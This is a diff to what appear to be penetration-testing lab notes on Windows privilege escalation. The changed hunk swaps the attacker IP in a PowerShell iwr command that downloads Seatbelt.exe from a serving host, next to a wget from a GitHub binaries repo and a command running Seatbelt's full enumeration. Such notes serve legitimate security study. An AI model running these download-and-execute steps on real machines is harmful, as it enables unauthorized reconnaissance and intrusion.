@@ -185,7 +185,7 @@ from powershell download the file we are serving up
 install seatbelt - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seatbelt
 ```
 wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/Seatbelt.exe
-iwr -uri http://192.168.45.219/Seatbelt.exe.1 -Outfile seatbelt.exe
+iwr -uri http://192.168.45.234/Seatbelt.exe.1 -Outfile seatbelt.exe
 .\seatbelt.exe -group=all
 ```
 
